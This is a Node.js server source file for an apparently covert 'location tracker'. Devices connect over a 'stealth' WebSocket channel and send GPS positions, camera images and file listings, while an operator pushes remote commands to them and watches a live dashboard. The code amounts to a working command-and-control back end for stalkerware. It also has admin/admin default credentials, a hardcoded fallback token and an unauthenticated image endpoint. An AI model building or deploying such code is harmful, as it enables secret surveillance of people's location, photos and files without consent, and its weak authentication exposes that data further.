import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import { createClient } from "@supabase/supabase-js";
import { WebSocketServer, WebSocket } from "ws";
import http from "http";

const app = express();
const PORT = process.env.PORT || 3000;

const deviceCommands = new Map();
const stealthConnections = new Map();
const webClients = new Set();
const deviceFileCache = new Map();

console.log("Starting location tracker server...");

const server = http.createServer(app);

const supabaseUrl = process.env.SUPABASE_URL || "https://hapwopjrgwdjwfawpjwq.supabase.co";
const supabaseKey = process.env.SUPABASE_ANON_KEY;

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";

if (!supabaseUrl || !supabaseKey) {
  console.error("Missing Supabase credentials");
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

app.use(cors());
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static("public"));

const wss = new WebSocketServer({ noServer: true });

server.on("upgrade", (request, socket, head) => {
  try {
    const url = new URL(request.url, `http://${request.headers.host}`);
    const pathname = url.pathname || "";

    if (pathname.startsWith("/ws/live") || pathname.startsWith("/ws/stealth")) {
      wss.handleUpgrade(request, socket, head, (ws) => {
        wss.emit("connection", ws, request);
      });
    } else {
      socket.destroy();
    }
  } catch (err) {
    socket.destroy();
  }
});

function broadcastToWebClients(obj) {
  const payload = JSON.stringify(obj);
  for (const client of webClients) {
    try {
      if (client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    } catch (e) {
      console.error("Error sending to web client:", e);
    }
  }
}

wss.on("connection", (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;
  let deviceId = url.searchParams.get("deviceId");
  
  if (pathname.startsWith("/ws/live")) {
    webClients.add(ws);
    console.log(`Web client connected. Total: ${webClients.size}`);

    ws.on("close", () => {
      webClients.delete(ws);
      console.log(`Web client disconnected. Total: ${webClients.size}`);
    });

    ws.on("error", (err) => {
      console.error("Web client error:", err);
    });
    
  } else if (deviceId && pathname.startsWith("/ws/stealth")) {
    ws.deviceId = deviceId;
    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
    console.log(`📱 Device ${deviceId} connected`);

    ws.on("message", (rawData) => {
      try {
        const msg = JSON.parse(rawData.toString());
        
        if (msg.type === 'ping') {
          console.log(`💓 Ping from ${deviceId}`);
          return;
        }
        
        if (msg.type === 'file_list') {
          deviceFileCache.set(deviceId, {
            files: msg.files,
            timestamp: Date.now()
          });
          console.log(`📁 Received ${msg.files.length} files from ${deviceId}`);
          return;
        }
        
        if (msg.type === 'image') {
          const deviceInfo = stealthConnections.get(deviceId);
          if (deviceInfo) {
            deviceInfo.latestImage = msg.data;
            deviceInfo.latestImageTime = Date.now();
          }
        }
        
        broadcastToWebClients({
          type: msg.type,
          deviceId: deviceId,
          data: msg.data,
          timestamp: msg.timestamp || Date.now()
        });
        
      } catch (err) {
        console.error(`Error from device ${deviceId}:`, err);
      }
    });

    ws.on("close", () => {
      stealthConnections.delete(deviceId);
      console.log(`Device ${deviceId} disconnected`);
    });

    ws.on("error", (err) => {
      console.error(`Device error (${deviceId}):`, err);
    });
    
  } else {
    ws.close();
  }
});

app.post("/api/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    return res.json({ success: true, token: SECRET_TOKEN });
  }
  return res.status(401).json({ success: false, error: "Invalid credentials" });
});

app.get('/api/device/:deviceId/files/:token', (req, res) => {
  const { deviceId, token } = req.params;
  
  if (token !== SECRET_TOKEN) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  const cached = deviceFileCache.get(deviceId);
  if (cached && (Date.now() - cached.timestamp < 60000)) {
    return res.json({ files: cached.files });
  }
  
  const device = stealthConnections.get(deviceId);
  if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(JSON.stringify({ action: 'get_files' }));
    
    setTimeout(() => {
      const updated = deviceFileCache.get(deviceId);
      res.json({ files: updated ? updated.files : [] });
    }, 2000);
  } else {
    res.json({ files: [] });
  }
});

app.get('/api/device/:deviceId/command/:token', (req, res) => {
  const { deviceId, token } = req.params;
  
  if (token !== SECRET_TOKEN) {
    return res.status(403).json({ error: "Forbidden" });
  }
  
  const command = deviceCommands.get(deviceId);
  
  if (command && (Date.now() - command.timestamp) < 30000) {
    deviceCommands.delete(deviceId);
    return res.json({ 
      action: command.action, 
      timestamp: command.timestamp 
    });
  }
  
  return res.json({ action: null });
});

app.post("/api/device/command", (req, res) => {
  const { device_id, command, token } = req.body;
  
  if (token !== SECRET_TOKEN) {
    return res.status(403).json({ error: "Forbidden" });
  }
  
  deviceCommands.set(device_id, {
    action: command.toLowerCase(),
    timestamp: Date.now()
  });
  
  const entry = stealthConnections.get(device_id);
  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
    entry.ws.send(JSON.stringify({ 
      action: command.toLowerCase(), 
      timestamp: Date.now() 
    }));
  }
  
  return res.json({ success: true });
});

app.post("/api/camera/image", (req, res) => {
  const token = req.headers.authorization;
  if (token !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });

  const { type, device_id, data, timestamp } = req.body;
  
  const deviceInfo = stealthConnections.get(device_id);
  if (deviceInfo && type === 'image') {
    deviceInfo.latestImage = data;
    deviceInfo.latestImageTime = Date.now();
  }
  
  broadcastToWebClients({ type, deviceId: device_id, data, timestamp: timestamp || Date.now() });
  return res.json({ success: true });
});

app.delete("/api/device/:device_id/:token", async (req, res) => {
  const { device_id, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { error } = await supabase.from("locations").delete().eq("device_id", device_id);
    if (error) throw error;
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post("/api/device/:device_id/rename/:token", async (req, res) => {
  const { device_id, token } = req.params;
  const { name } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { error } = await supabase.from("locations").update({ device_name: name }).eq("device_id", device_id);
    if (error) throw error;
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post("/api/location", async (req, res) => {
  const receivedToken = req.headers.authorization;
  if (receivedToken !== SECRET_TOKEN) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const { device_id, device_name, latitude, longitude, timestamp, accuracy, battery, wifi_info } = req.body;

  if (!validateGPSPoint(latitude, longitude, accuracy)) {
    return res.status(400).json({ error: "Invalid GPS coordinates" });
  }

  let timestampValue = typeof timestamp === "string" ? new Date(timestamp).getTime() : timestamp;

  try {
    const { error } = await supabase.from("locations").insert([{
      device_id, device_name,
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      timestamp: timestampValue,
      accuracy: parseFloat(accuracy),
      battery: battery != null ? parseInt(battery) : null,
      wifi_info: wifi_info || null
    }]);

    if (error) throw error;

    broadcastToWebClients({
      type: "location",
      deviceId: device_id,
      data: { latitude: parseFloat(latitude), longitude: parseFloat(longitude), accuracy: parseFloat(accuracy), battery },
      timestamp: timestampValue || Date.now()
    });

    return res.json({ success: true });
  } catch (err) {
    console.error("Location save error:", err);
    return res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/devices/:token", async (req, res) => {
  const { token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { data, error } = await supabase
      .from("locations")
      .select("device_id, device_name, latitude, longitude, timestamp, battery, accuracy")
      .order("timestamp", { ascending: false });

    if (error) throw error;

    const devices = {};
    data.forEach((location) => {
      if (!devices[location.device_id]) {
        devices[location.device_id] = {
          device_id: location.device_id,
          device_name: location.device_name,
          last_seen: location.timestamp,
          battery: location.battery,
          location_count: 0,
          last_location: { lat: location.latitude, lng: location.longitude },
          is_connected: stealthConnections.has(location.device_id)
        };
      }
      devices[location.device_id].location_count++;
    });

    return res.json(Object.values(devices));
  } catch (err) {
    return res.status(500).json({ error: "Database error" });
  }
});

app.get("/api/device/:deviceId/:token", async (req, res) => {
  const { deviceId, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { data, error } = await supabase
      .from("locations")
      .select("*")
      .eq("device_id", deviceId)
      .order("timestamp", { ascending: true })
      .limit(1000);

    if (error) throw error;

    const filteredLocations = filterDuplicatePoints(
      data.filter((loc) => validateGPSPoint(loc.latitude, loc.longitude, loc.accuracy))
    );

    return res.json({
      device_id: deviceId,
      device_name: data[0]?.device_name || "Unknown Device",
      locations: filteredLocations,
      total_points: data.length,
      is_connected: stealthConnections.has(deviceId)
    });
  } catch (err) {
    return res.status(500).json({ error: "Database error" });
  }
});

app.get('/api/device/:deviceId/latest-image', (req, res) => {
  const deviceId = req.params.deviceId;
  const deviceInfo = stealthConnections.get(deviceId);
  
  if (deviceInfo && deviceInfo.latestImage) {
    res.json({
      success: true,
      image: deviceInfo.latestImage,
      timestamp: deviceInfo.latestImageTime
    });
  } else {
    res.json({ success: false, message: 'No image available' });
  }
});

app.get("/", (req, res) => {
  res.sendFile("index.html", { root: "public" });
});

function validateGPSPoint(lat, lng, accuracy) {
  if (lat === undefined || lng === undefined) return false;
  const nLat = parseFloat(lat);
  const nLng = parseFloat(lng);
  if (Number.isNaN(nLat) || Number.isNaN(nLng)) return false;
  if (nLat < -90 || nLat > 90 || nLng < -180 || nLng > 180) return false;
  if (accuracy && parseFloat(accuracy) > 100) return false;
  return true;
}

function filterDuplicatePoints(locations, minDistance = 10) {
  if (!locations || locations.length < 2) return locations;
  const filtered = [locations[0]];

  for (let i = 1; i < locations.length; i++) {
    const prev = filtered[filtered.length - 1];
    const curr = locations[i];

    const distance = getDistance(
      parseFloat(prev.latitude), parseFloat(prev.longitude),
      parseFloat(curr.latitude), parseFloat(curr.longitude)
    );

    const effectiveDistance = distance - (prev.accuracy || 0) - (curr.accuracy || 0);

    if (effectiveDistance > minDistance) {
      filtered.push(curr);
    }
  }

  return filtered;
}

function getDistance(lat1, lon1, lat2, lon2) {
  const R = 6371e3;
  const φ1 = lat1 * Math.PI / 180;
  const φ2 = lat2 * Math.PI / 180;
  const Δφ = (lat2 - lat1) * Math.PI / 180;
  const Δλ = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
            Math.cos(φ1) * Math.cos(φ2) *
            Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
